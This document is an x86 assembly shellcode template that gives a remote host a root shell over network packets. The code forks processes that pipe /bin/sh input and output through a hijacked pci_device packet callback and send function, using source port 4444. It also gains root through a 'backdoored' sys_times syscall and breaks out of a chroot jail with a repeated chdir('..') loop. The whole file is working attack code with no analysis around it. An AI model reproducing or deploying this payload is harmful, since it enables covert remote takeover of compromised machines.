[bits 32]

; setup a stack frame
push ebp
mov ebp, esp

; get the start load address of this module
call get_mod_base

; create pipes for communications with the shell
mov edi, eax
add edi, pipe_stdin_read
mov esi, eax
add esi, pipe_stdout_read

; pipe(&pipe_stdin_read)
push edi
push 0x2a
pop eax
call do_syscall3
pop eax

; pipe(&pipe_stdout_read)
push esi
push 0x2a
pop eax
call do_syscall3
pop eax

; fork
push 0x2
pop eax
call do_syscall3

test eax, eax
jz child1

; fork some more
push 0x2
pop eax
call do_syscall3

test eax, eax
jz child2

; parent process will dup2 the pipes to file descriptors 0, 1 and 2, then execv('/bin/sh')
; close the other ends of pipe in this process
push dword [edi+4]
call close_fd
pop eax
push dword [esi]
call close_fd
pop eax

; dup2 pipes to stdin, stdout, stderr
push 0
push dword [edi]
push 0x3f
pop eax
call do_syscall3
pop eax
pop eax

push 1
push dword [esi+4]
push 0x3f
pop eax
call do_syscall3
pop eax
pop eax

push 2
push dword [esi+4]
push 0x3f
pop eax
call do_syscall3
pop eax
pop eax

; activate priv-x
call get_root

; chroot escape
call chroot_escape

; execv
push 0
call get_mod_base
add eax, shell_string
push eax
mov edi, esp

push 0
push edi
push eax
push 0xb
pop eax
call do_syscall3

; note: should not reach this point unless execve syscall fails
int3

; this child will handle input from the remote host and pass it to the shell
child1:
; close other pipes
push dword [edi]
call close_fd
pop eax

push dword [esi]
call close_fd
pop eax

push dword [esi+4]
call close_fd
pop eax

; set the received packet callback function in the pci_device structure
mov esi, [ebp+8]
mov esi, [esi+8]
call get_mod_base
add eax, handleMessage
mov [esi+0x9f8], eax

; run the recvLoop function -- NOTE: does not return
push esi
mov eax, ${recvLoop}
call eax

; handle an incoming packet
handleMessage:
push ebp
mov ebp, esp
push ebx
push ecx
push edx

call get_mod_base

;write(pipe_stdin_write, pkt_data, pkt_len)
; param 6 to handleMessage is UDP payload length
push dword [ebp+0x1c]
; param 5 to handleMessage is UDP payload data
push dword [ebp+0x18]
push dword [eax+pipe_stdin_write]
push 4
pop eax
call do_syscall3
add esp, 12

; make sure write call was successful, otherwise exit
xor ebx, ebx
cmp eax, ebx
jge handleMessageDone

exit_process:
;exit(0)
push 0
push 1
pop eax
call do_syscall3

handleMessageDone:

pop edx
pop ecx
pop ebx
leave
ret


; child2 gets output from stdout and sends it over the wire
child2:
; close other pipes
push dword [edi]
call close_fd
pop eax

push dword [edi+4]
call close_fd
pop eax

push dword [esi+4]
call close_fd
pop eax

; allocate some stack space to receive data from the shell
sub esp, 1460
mov edi, esp

child2_loop:

;read(pipe_stdout_out, buf, sizeof(buf))
push 1460
push edi
push dword [esi]
push 3
pop eax
call do_syscall3
add esp, 12

; check for error
xor ebx, ebx
cmp eax, ebx
jle exit_process

; send it on over the wire
push esi
mov ebx, edi
call send_message
pop esi

jmp child2_loop

send_message:
; get the sessionInfo structure from the frame pointer
mov esi, [ebp+8]
push eax		; len(payload)
push ebx		; payload
push dword [esi+4]	; dstPort
push dword [esi+0]	; dstip
push 4444		; srcPort
push dword [esi+8]	; pci_device*
mov esi, ${sendPkt}
call esi
add esp, 6*4
ret

close_fd:
 push ebx
 mov ebx, [esp+8]
 push 6
 pop eax
 int 0x80
 pop ebx
 ret

do_syscall3:
 mov	edx, [esp+0xc]
 mov    ecx, [esp+0x8]
 mov    ebx, [esp+4]
 int	0x80
 ret

get_mod_base:
 call get_mod_base_int
get_mod_base_int:
 pop eax
 sub eax, get_mod_base_int
 ret

; got r00t?
get_root:
 ; call our backdoored sys_times function
 push 0x2b
 pop eax
 call do_syscall3
 ret

chroot_escape:
 ;jailbreak
 push ebp
 mov ebp, esp

 ;mkdir('bye')
 push 0x657962
 mov edi, esp
 push 0x1ff
 push edi
 push 0x27
 pop eax
 call do_syscall3

 ;chroot('bye')
 push 0x3d
 pop eax
 call do_syscall3

 ; for (i=0; i < 40; i++) chdir("..")
 push 40
 pop ecx

 push 0x2e2e
 mov edi, esp

chroot_escape_freedom:
 push ecx
 push edi
 push 0xc
 pop eax
 call do_syscall3
 pop ecx
 pop ecx
 dec ecx
 jnz chroot_escape_freedom

 ; chroot("..")
 push edi
 push 0x3d
 pop eax
 call do_syscall3

 leave
 ret

; data section
shell_string:
 db '/bin/sh', 0

; bss section
pipe_stdin_read:
 resb 4
pipe_stdin_write:
 resb 4
pipe_stdout_read:
 resb 4
pipe_stdout_write:
 resb 4

